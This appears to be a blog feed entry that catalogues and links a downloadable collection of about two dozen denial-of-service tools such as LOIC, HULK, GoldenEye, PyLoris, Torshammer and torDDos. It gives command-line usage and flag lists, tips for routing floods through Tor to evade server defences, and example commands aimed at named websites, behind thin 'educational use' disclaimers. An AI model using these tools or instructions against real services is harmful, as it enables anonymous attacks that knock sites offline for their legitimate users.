/><published>2021-08-10T00:00:00-04:00</published><updated>2021-09-21T05:00:03-04:00</updated><id>https://theodorecooper.github.io/pentest/ddos-tools</id><content type="html" xml:base="https://theodorecooper.github.io/pentest/2021-ddos-tools/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;what-is-ddos&quot;&gt;What is DDos?&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;In computing, a denial-of-service attack is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;how-to-get-the-collection&quot;&gt;How to get the collection?&lt;/h2&gt;
+
+&lt;p&gt;​	All the tools have been pushed to my github repository: &lt;a href=&quot;https://github.com/theodorecooper/DDos-Attack-Tools&quot;&gt;&lt;strong&gt;&lt;em&gt;Download&lt;/em&gt;&lt;/strong&gt;: theodorecooper/DDos-Attack-Tools&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The collection will keep updating, adding new tools &amp;amp; tutorials. Please Follow/Watch/Star to get the latest updating.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;more-projects-theodorecooper&quot;&gt;&lt;em&gt;More projects: &lt;a href=&quot;https://github.com/theodorecooper?tab=repositories&quot;&gt;@theodorecooper&lt;/a&gt;&lt;/em&gt;&lt;/h4&gt;
+
+&lt;h4 id=&quot;reach-me-hi-there-im-theodore&quot;&gt;&lt;em&gt;Reach me: &lt;a href=&quot;https://github.com/theodorecooper/theodorecooper&quot;&gt;Hi there!👋 I’m Theodore!&lt;/a&gt;&lt;/em&gt;&lt;/h4&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
+
+&lt;p&gt;All collected tools and scripts come from the Internet and have passed the test, but we are not responsible for any undetected danger of software or scripts that may cause harm to your computer.&lt;/p&gt;
+
+&lt;h2 id=&quot;legal-notice&quot;&gt;LEGAL NOTICE&lt;/h2&gt;
+
+&lt;p&gt;THESE SOFTWARES AND SCRIPTS ARE PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY WE DO NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THESE SOFTWARES AND SCRIPTS YOU AGREE WITH THESE TERMS.&lt;/p&gt;
+
+&lt;h2 id=&quot;software--script-info&quot;&gt;Software &amp;amp; Script Info&lt;/h2&gt;
+
+&lt;h3 id=&quot;1-loic-low-orbit-ion-cannon_windows&quot;&gt;1. LOIC (Low Orbit Ion Cannon_Windows)&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;LOIC is an open-source network stress testing and denial-of-service attack application, written in C#. LOIC was initially developed by Praetox Technologies, but was later released into the public domain, and now is hosted on several open source platforms.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;2-davoset&quot;&gt;2. davoset&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;DDoS attacks via other sites execution tool. It is console (command line) tool for conducting DDoS attacks on the sites via Abuse of Functionality and XML External Entities vulnerabilities at other sites.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;3-ddosim&quot;&gt;3. ddosim&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;DDOSIM is a tool that can be used in a laboratory environment to simulate a distributed denial of service (DDOS) attack against a target server. … It simulates several zombie hosts (having random IP addresses) which create full TCP connections to the target server.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;4-goldeneye&quot;&gt;4. GoldenEye&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;GoldenEye is an python app for security testing.
+GoldenEye is a HTTP DoS Test Tool.&lt;/p&gt;
+  &lt;h4 id=&quot;usage&quot;&gt;Usage&lt;/h4&gt;
+  &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; USAGE: ./goldeneye.py &amp;lt;url&amp;gt; [OPTIONS]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; OPTIONS:
+    Flag           Description                     Default
+    -u, --useragents   File with user-agents to use                     (default: randomly generated)
+    -w, --workers      Number of concurrent workers                     (default: 50)
+    -s, --sockets      Number of concurrent sockets                     (default: 30)
+    -m, --method       HTTP Method to use 'get' or 'post'  or 'random'  (default: get)
+    -d, --debug        Enable Debug Mode [more verbose output]          (default: False)
+    -h, --help         Shows this help #### Utilities * util/getuas.py - Fetchs user-agent lists from http://www.useragentstring.com/pages/useragentstring.php subpages (ex: ./getuas.py http://www.useragentstring.com/pages/Browserlist/) *REQUIRES BEAUTIFULSOUP4* * res/lists/useragents - Text lists (one per line) of User-Agent strings (from http://www.useragentstring.com) #### License This software is distributed under the GNU General Public License version 3 (GPLv3)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;5-hoic-high-orbit-ion-cannon&quot;&gt;5. Hoic (High Orbit Ion Cannon)&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Hoic is an open-source network stress testing and denial-of-service attack application designed to attack as many as 256 URLs at the same time. It was designed to replace the Low Orbit Ion Cannon which was developed by Praetox Technologies and later released into the public domain.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;6-hulk-https-unbearable-load-king&quot;&gt;6. HULK (HTTPS Unbearable Load King)&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;https://img.shields.io/badge/python-3.6%20%7C%203.7-blue?style=for-the-badge&quot; alt=&quot;Python Version&quot; /&gt;
+&lt;img src=&quot;https://img.shields.io/badge/License-GNU-green?style=for-the-badge&quot; alt=&quot;License&quot; /&gt;
+&lt;img src=&quot;https://img.shields.io/badge/platform-Windows--10-lightgrey?style=for-the-badge&quot; alt=&quot;Platform&quot; /&gt;
+&lt;img src=&quot;https://img.shields.io/codacy/grade/a5939f58e4c44daebfbe46937686050b?style=for-the-badge&quot; alt=&quot;Codacy grade&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;introduction&quot;&gt;Introduction&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;This script is a &lt;em&gt;Distributed Denial of Service&lt;/em&gt; tool that can put heavy load on HTTPS servers,
+in order to bring them to their knees, by exhausting the resource pool.
+Its is meant for research purposes only and any malicious usage of this tool is prohibited.
+&lt;strong&gt;The authors aren’t to be held responsible for any consequence of usage of this tool.&lt;/strong&gt;
+ Authors : &lt;strong&gt;Hyperclaw79&lt;/strong&gt;, &lt;em&gt;version 3.0, 2.0&lt;/em&gt;; &lt;strong&gt;Barry Shteiman&lt;/strong&gt; , &lt;em&gt;version 1.0&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;usage-1&quot;&gt;Usage&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip install -r requirements.txt&lt;/code&gt; before starting this script.&lt;/li&gt;
+  &lt;li&gt;Launch the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hulk-server.py&lt;/code&gt; with the target website as arg.
+  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python hulk-server.py https://testdummysite.com&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Launch the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hulk-launcher.py&lt;/code&gt; to spawn multiple processes of hulk - one per CPU Core.
+  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python hulk-launcher.py localhost&lt;/code&gt;&lt;/p&gt;
+
+    &lt;blockquote&gt;
+      &lt;p&gt;If it’s a bot on a remote client, replace localhost with the server’s IP.&lt;/p&gt;
+    &lt;/blockquote&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Sit back and sip your coffee while the carnage unleashes! &amp;gt;:D
+    &lt;h4 id=&quot;license&quot;&gt;License&lt;/h4&gt;
+    &lt;p&gt;HULK v3 is a Python 3 compatible Asynchronous Distributed Denial of Service Script.
+&lt;a href=&quot;http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/&quot;&gt;Original script&lt;/a&gt; was created by Barry Shteiman.
+You can use that one if you have Python 2.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Using a GNU license cause there was no mention about any license used by Barry.
+Feel free to modify and share it, but leave some credits to us both and don’t hold us liable.&lt;/p&gt;
+
+&lt;h3 id=&quot;7-pyloris&quot;&gt;7. pyloris&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Using HTTPLoris is simple. In its most basic form, HTTPLoris merely needs a copy of Python 2.6.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;usage-2&quot;&gt;Usage&lt;/h4&gt;
+&lt;p&gt;On a Linux machine, one must simply invoke the script in a terminal, stating a site to test:&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;motoma@rocksalt:/home/motoma&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python pyloris-3.0.py motomastyle.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;On Mac OS X, one invokes PyLoris the same way. Using the Terminal Application:&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hotdog:/Users/Motoma/ motoma&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python pyloris-3.0.py motomastyle.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Using HTTPLoris in Windows is a little different. One will need to know the location of the Python installation, and be in the proper directory. Load up a command prompt:&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;otoma&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;yloris-3.0&amp;gt;C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;ython26&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;ython.exe pyloris-3.0.py motomastyle.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;advanced-options&quot;&gt;Advanced Options&lt;/h4&gt;
+&lt;p&gt;Invoking HTTPLoris by using the commands above start a limited to 500 connections across 50 threads, each sending at 1 byte/second and waiting until the connection is forced shut by the server. While this behavior will bog down an Apache server with the default settings, it is not a very thorough test. The following are some additionall options that will allow one to customize the way HTTPLoris works:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-a, --attacklimit
+The --attacklimit flag restricts the number of total connections (current + completed) during a single session. Set this to zero to specify no limit.
+-c, --connectionlimit
+Adjusting the --connectionlimit flag can drastically change how well HTTPLoris performs. The --connectionlimit flag directly controls the number of concurrent connections held during the session. In a base Apache environment, when this number is above the MaxClients setting, the server is unresponsive.
+-t, --threadlimit
+This is the number of attacker threads run during the session.
+-b, --connectionspeed
+This is the connection speed for each individual connection in bytes/second. Comparing this with the lenght of the request, and you should have an accurate guess of how long each connection should linger.
+-f, --finish
+Specifying the --finish flag will cause HTTPLoris to finish and close connections upon the completion of the request. This will prompt servers to send full responses to the HTTP requests that are made.
+-k --keepalive
+Using the --keepalive flag will add the Connection: Keep-Alive header to the HTTP request. On vulnerable servers, this will increase the duration of connections considerably.
+-p, --port
+HTTPLoris will connect on port 80 by default. Specifying the --port flag will change this behavior.
+-P, --page
+By default, HTTPLoris will make HTTP requests for &quot;/&quot;. Setting the --page flag will allow one to control the page that HTTPLoris requests.
+-q, --quit
+Terminate the connection without receiving reply from the server. This will reduce the effectivenes as connections will terminate as soon as the full request buffer has been sent.
+-r, --requesttype
+Setting the --requesttype flag will change the HTTP method used. Available options are GET, HEAD, POST, PUT, DELETE, OPTIONS, and TRACE. Certain proxies and load balancers will filter out certain types of requests, and hold them until the requests are complete. POST requests are commonly passed through due to their potential for large sizes, therefore this may cause different behavior.
+-R, --referer
+Adds a referring URL to the HTTP request.
+-s, --Size
+The --size flag allows one to increase the size of the request made. Increasing the size will in turn increase the duration of connections, leading to a longer sustained test. In situations where servers or firewalls are set to terminate unfinished connections, this can extend the length of the test drastically. This can also be used to test a web server's capability to handle multiple large requests and benchmark memory usage. The additional data is filled in the Cookie-Data field.
+-u, --useragent
+By default, HTTPLoris advertizes itself in the User-Agent header. The --useragent flag allows one to override this and masquerade as other web browsers. Useful because some sites will render different pages for different web browsers. 
+-z, --gzip
+Specifying the --gzip flag will allow instruct PyLoris to send an &quot;Accept-Encoding: gzip&quot; header. When combined with the --quit and --finish flags, this can test for the CEV-2009-1891 DoS vulnerability (http://www.mail-archive.com/dev@httpd.apache.org/msg44323.html). Also leads to larger CPU usage and smaller bandwidth usage.
+-w, --timebetweenthreads
+Setting the --timebetweenthreads flag will adjust the amount of time between threads spawning. Adjusting this in conjunction with the --threadlimit will change the CPU load on your local machine.
+-W, --timebetweenconnections
+Setting the --timebetweenconnections flag will adjust the amount of time between socket connections. This will directly affect how quickly the target's connection limit is reached.
+Proxy Options 
+HTTPLoris is able to connect through SOCKS4, SOCKS5, and HTTP proxies. This allows HTTPLoris to run through SSH tunnels, as well as TOR. Utilizing TOR should essentially eliminate the mitigating effects of ipchains, mod_antiloris, and mod_noloris.
+--socksversion
+Setting the --socksversion flag tells HTTPLoris to connect through a SOCKS proxy. Allowed values are SOCKS4, SOCKS5, and HTTP.
+--sockshost
+Set the --sockshost flag to the address of the SOCKS proxy when --socksversion is set. If this is not set, HTTPLoris will default to 127.0.0.1.
+--socksport
+Set the --socksport flag to the port number of the SOCKS proxy when --socksversion is set. 
+--socksuser and --sockspass
+Optionally, one may set a username and password for the SOCKS proxy using these two flags.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;8-rudy-r-u-dead-yet&quot;&gt;8. Rudy (R U Dead yet)&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;‘R U Dead Yet?’ or R.U.D.Y. is a denial-of-service attack tool that aims to keep a web server tied up by submitting form data at an absurdly slow pace. A R.U.D.Y. exploit is categorized as a low-and-slow attack, since it focuses on creating a few drawn-out requests rather than overwhelming a server with a high volume of quick requests. A successful R.U.D.Y. attack will result in the victim’s origin server becoming unavailable to legitimate traffic.&lt;br /&gt;
+The R.U.D.Y. software includes a user-friendly point-and-click interface, so all an attacker needs to do is point the tool at a vulnerable target. Any web service that accepts form input is vulnerable to a R.U.D.Y. attack, since the tool works by sniffing out form fields and exploiting the form submission process.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;9-torshammer&quot;&gt;9. Torshammer&lt;/h3&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;USAGE:
+./torshammer.py -t &amp;lt;target&amp;gt; [-r &amp;lt;threads&amp;gt; -p &amp;lt;port&amp;gt; -T -h]
+-t|--target &amp;lt;Hostname|IP&amp;gt;
+-r|--threads &amp;lt;Number of threads&amp;gt; Defaults to 256
+-p|--port &amp;lt;Web Server Port&amp;gt; Defaults to 80
+-T|--tor Enable anonymising through tor on 127.0.0.1:9050
+-h|--help Shows this help
+Eg. ./torshammer.py -t 192.168.1.100 -r 256
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;10-hping&quot;&gt;10. hping&lt;/h3&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DESCRIPTION
+	hping3 is a network tool able to send custom TCP/IP
+	packets and to display target replies like ping do with
+	ICMP replies. hping3 can handle fragmentation, and
+	almost arbitrary packet size and content, using the
+	command line interface.
+	Since version 3, hping implements scripting capabilties,
+	read the API.txt file under the /docs directory to know
+	more about it.
+	As a command line utility, hping is useful to test at
+	many kind of networking devices like firewalls, routers,
+	and so. It can be used as a traceroute alike program over all
+	the supported protocols, firewalk usage, OS fingerprinting,
+	port-scanner (see the --scan option introduced with hping3),
+	TCP/IP stack auditing.
+	It's also really a good didactic tool to learn TCP/IP.
+	Using Tcl/Tk scripting much more can be done, because
+	while the hping3 packet generation code is actually the
+	hping2 put there mainly for compatibility with the command
+	line interface, all the real news are about scripting.
+	See the libs directory for example scripts. To run
+	the example scripts type:
+		hping3 exec ScriptName.htcl &amp;lt;arguments, if required&amp;gt;
+	hping3 is developed and manteined by antirez@invece.org
+	with the help of other hackers, and comes under GPL version
+	2 of license. Development is open so you can send me
+	patches/suggestions/affronts without inhibitions.
+	Please check the AUTHORS file for a list of people that
+	contribued with code, ideas, bug reports.
+	Also vim developer, ee.lbl.gov for tcpdump and GNU in general.
+DOCUMENTATION
+	For the hping3 API check docs/API.txt
+	You can find documentation about hping3 specific functions
+	at http://wiki.hping.org
+	Make sure to check the page at http://wiki.hping.org/34
+REQUIREMENTS
+	A supported unix-like OS, gcc, root access.
+	Libpcap.
+	Tcl/Tk is optional but strongly suggested.
+INSTALLATION
+	see INSTALL file.
+have fun,
+antirez
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;11-refref&quot;&gt;11. #Refref&lt;/h3&gt;
+&lt;p&gt;#Refref - An SQLi injection DDOS tool&lt;/p&gt;
+
+&lt;h3 id=&quot;12-hyenae&quot;&gt;12. Hyenae&lt;/h3&gt;
+&lt;h4 id=&quot;features&quot;&gt;Features&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;ARP-Request flooding&lt;/li&gt;
+  &lt;li&gt;ARP-Cache poisoning&lt;/li&gt;
+  &lt;li&gt;PPPoE session initiation flooding&lt;/li&gt;
+  &lt;li&gt;Blind PPPoE session termination&lt;/li&gt;
+  &lt;li&gt;ICMP-Echo flooding&lt;/li&gt;
+  &lt;li&gt;ICMP-Smurf attack&lt;/li&gt;
+  &lt;li&gt;ICMP based TCP-Connection reset&lt;/li&gt;
+  &lt;li&gt;TCP-SYN flooding&lt;/li&gt;
+  &lt;li&gt;TCP-Land attack&lt;/li&gt;
+  &lt;li&gt;Blind TCP-Connection reset&lt;/li&gt;
+  &lt;li&gt;UDP flooding&lt;/li&gt;
+  &lt;li&gt;DNS-Query flooding&lt;/li&gt;
+  &lt;li&gt;DHCP-Discover flooding&lt;/li&gt;
+  &lt;li&gt;DHCP starvation attack&lt;/li&gt;
+  &lt;li&gt;DHCP-Release forcing&lt;/li&gt;
+  &lt;li&gt;Cisco HSRP active router hijacking&lt;/li&gt;
+  &lt;li&gt;Pattern based packet address configuration&lt;/li&gt;
+  &lt;li&gt;Intelligent address and address protocol detection&lt;/li&gt;
+  &lt;li&gt;Smart wildcard-based randomization&lt;/li&gt;
+  &lt;li&gt;Daemon for setting up remote attack networks - HyenaeFE QT-Frontend support&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;13-boompython&quot;&gt;13. Boom(Python)&lt;/h3&gt;
+
+&lt;h3 id=&quot;14-rcpnet&quot;&gt;14. RCPnet&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;A multi-tool for network pen-testing written in python. It contains effective ping functions, hostname traceroute, and cloudflare detection. This is a modification from the FoxNuke Project, which only intended to be a DOS tool for network pen testing.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;15-maddstress&quot;&gt;15. MaddStress&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;MaddStress is a simple denial-of-service (DDoS) attack tool that refers to attempts to burden a network or server with requests, making it unavailable to users.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;features-1&quot;&gt;Features&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;Strongest &amp;amp; Best DDoS Tools&lt;/li&gt;
+  &lt;li&gt;UDP Configuration&lt;/li&gt;
+  &lt;li&gt;TCP Configuration&lt;/li&gt;
+  &lt;li&gt;SYN Configuration&lt;/li&gt;
+  &lt;li&gt;Proxy Configuration&lt;/li&gt;
+  &lt;li&gt;URL Grabber&lt;/li&gt;
+  &lt;li&gt;Port Scanner&lt;/li&gt;
+  &lt;li&gt;CloudFlare Resolver&lt;/li&gt;
+  &lt;li&gt;Multi CloudFlare Resolver&lt;/li&gt;
+  &lt;li&gt;Proxy Attack &amp;amp; Generator&lt;/li&gt;
+  &lt;li&gt;Always Updates &amp;amp; Current News&lt;/li&gt;
+  &lt;li&gt;System Information&lt;/li&gt;
+  &lt;li&gt;Network Information&lt;/li&gt;
+  &lt;li&gt;Simple Design UI&lt;/li&gt;
+  &lt;li&gt;User friendly GUI&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;16-dequiem&quot;&gt;16. Dequiem&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Dequiem is a DDoS tool written in python 2.7&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;features-2&quot;&gt;Features&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;DDoS&lt;/li&gt;
+  &lt;li&gt;Find a website’s IP&lt;/li&gt;
+  &lt;li&gt;Port Scanning&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;17-nemesis&quot;&gt;17. NEMESIS&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;NEMESIS is tool like torshammer or pyloic, used to Distributed Denial of Service attacks, writen in C#&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;18-chihulk&quot;&gt;18. ChiHULK&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Written in python 2.7&lt;br /&gt;
+Edited version of the DDoS / DoS tool called HULK(.py).&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;19-pentados&quot;&gt;19. PentaDos&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Written in python 2.7&lt;br /&gt;
+A tool designed by members of PentagonCrew to help
+you easily take down websites. &lt;em&gt;Ethical uses only&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;20-moihack-dos-attack-tool-reloaded&quot;&gt;20. Moihack DoS Attack Tool Reloaded&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;A simple TCP/UDP Port Flooder written in Python.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;21-slowloris&quot;&gt;21. Slowloris&lt;/h3&gt;
+
+&lt;h3 id=&quot;22-anddos&quot;&gt;22. AnDDoS&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Stealth Anonymous Kill-The-Server&lt;/p&gt;
+
+  &lt;p&gt;The classic DDoS! Overload the server.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;23-torddos&quot;&gt;23. torDDos&lt;/h3&gt;
+&lt;h4 id=&quot;author-r3nt0n&quot;&gt;Author: &lt;a href=&quot;https://github.com/r3nt0n&quot;&gt;r3nt0n&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;http://img.shields.io/badge/version-v1.0-orange.svg&quot; alt=&quot;[Version 1.0](https://github.com/R3nt0n)&quot; /&gt;
+&lt;img src=&quot;http://img.shields.io/badge/python-2.7-blue.svg&quot; alt=&quot;[Python 2.7](https://github.com/R3nt0n)&quot; /&gt;
+&lt;img src=&quot;https://img.shields.io/badge/license-GPL%203.0-brightgreen.svg&quot; alt=&quot;[GPL-3.0 License](https://github.com/R3nt0n)&quot; /&gt;
+&lt;img src=&quot;http://img.shields.io/badge/date-14/07/2019-yellow.svg&quot; alt=&quot;[Date](https://github.com/R3nt0n)&quot; /&gt;  &lt;br /&gt;
+TorDDos is a Python tool to automatize DDos attacks to a website from the Tor network.&lt;/p&gt;
+
+&lt;p align=&quot;left&quot;&gt;&lt;img src=&quot;https://github.com/R3nt0n/torDDos/blob/master/img/torddos.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;usage-3&quot;&gt;Usage&lt;/h4&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  -h, --help        show this help message and exit
+  -t , --target     server to kick-out
+  -n , --attempts   number of attempts of attack (default: 5)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;how-it-works&quot;&gt;How it works&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;Creates a new Tor session.&lt;/li&gt;
+  &lt;li&gt;Makes a request to the website you choose as a target.&lt;/li&gt;
+  &lt;li&gt;Releases the Tor session, then creates another and request data again to the website.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;requirements&quot;&gt;Requirements&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;Linux system&lt;/li&gt;
+  &lt;li&gt;Python 2.7&lt;/li&gt;
+  &lt;li&gt;Tor service&lt;/li&gt;
+  &lt;li&gt;requests&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;legal-disclaimer&quot;&gt;Legal disclaimer&lt;/h4&gt;
+&lt;p&gt;This tool is created for the sole purpose of security awareness and education, it should not be used against systems that you do not have permission to test/attack. The author is not responsible for misuse or for any damage that you may cause. You agree that you use this software at your own risk.&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Pentest" /><category term="Pentest" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/ddos-tools/ddos-tools.jpeg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/ddos-tools/ddos-tools.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
